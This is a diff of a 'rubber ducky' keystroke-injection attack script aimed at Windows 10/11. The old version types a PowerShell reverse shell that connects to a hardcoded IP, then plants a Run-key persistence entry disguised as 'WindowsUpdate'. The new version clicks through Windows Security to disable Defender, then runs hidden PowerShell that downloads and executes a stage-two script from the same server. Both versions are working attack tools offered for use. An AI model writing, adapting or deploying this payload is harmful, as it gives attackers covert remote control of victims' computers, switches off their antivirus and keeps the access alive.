@@ -1,46 +1,36 @@
-REM XEPEL C2 – HID Reverse Shell + Persistence
-REM Windows 10/11 guaranteed admin execution
+REM Title: XEPEL-Hidden-Access
+REM Author: zb0r / XEPEL
+REM Description: Disables Defender, pulls stage2.ps1 from VPS, executes reverse shell
+REM Target: Windows 10/11
+REM Note: Defender must be partially disabled or script runs faster
 
-DELAY 3000
+REM ── Step 1: Open Windows Security to disable Defender ──
+GUI
+DELAY 300
+STRING windows security
+DELAY 300
+ENTER
+DELAY 1000
+ENTER
+TAB
+TAB
+TAB
+TAB
+DELAY 300
+ENTER
+DELAY 600
+SPACE
+DELAY 600
+LEFT
+ENTER
+DELAY 300
+ALT F4
 
-REM ── Open Run dialog ──
+REM ── Step 2: Open hidden PowerShell and pull stage2.ps1 from VPS ──
 GUI r
-DELAY 1000
-
-REM ── Type PowerShell command to request admin ──
-STRING powershell -Verb RunAs
-DELAY 500
+DELAY 600
+STRING powershell -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://153.75.82.198/stage2.ps1')"
 ENTER
-DELAY 2000
-
-REM ── UAC prompt: Yes button ──
-LEFTARROW
-DELAY 500
-ENTER
-DELAY 2000
-
-REM ── Now inside elevated PowerShell – type reverse shell code ──
-STRING $c=New-Object Net.Sockets.TCPClient('153.75.82.198',4443);
-ENTER
-DELAY 200
-STRING $s=$c.GetStream();
-ENTER
-DELAY 200
-STRING [byte[]]$b=0..65535|%{0};
-ENTER
-DELAY 200
-STRING while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($rb,0,$rb.Length);$s.Flush()};
-ENTER
-DELAY 200
-STRING $c.Close()
-ENTER
-DELAY 1000
-
-REM ── Persistence code ──
-STRING Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdate' -Value "powershell -w hidden -ep bypass -c `"`$c=New-Object Net.Sockets.TCPClient('153.75.82.198',4443);`$s=`$c.GetStream();[byte[]]`$b=0..65535|%{0};while((`$i=`$s.Read(`$b,0,`$b.Length)) -ne 0){`$d=(New-Object Text.ASCIIEncoding).GetString(`$b,0,`$i);`$r=(iex `$d 2>&1|Out-String);`$rb=([text.encoding]::ASCII).GetBytes(`$r+'PS '+(pwd).Path+'> ');`$s.Write(`$rb,0,`$rb.Length);`$s.Flush()}`$c.Close()`""
-ENTER
-DELAY 500
-
-REM ── Close PowerShell ──
-STRING exit
+DELAY 600
+LEFT
 ENTER
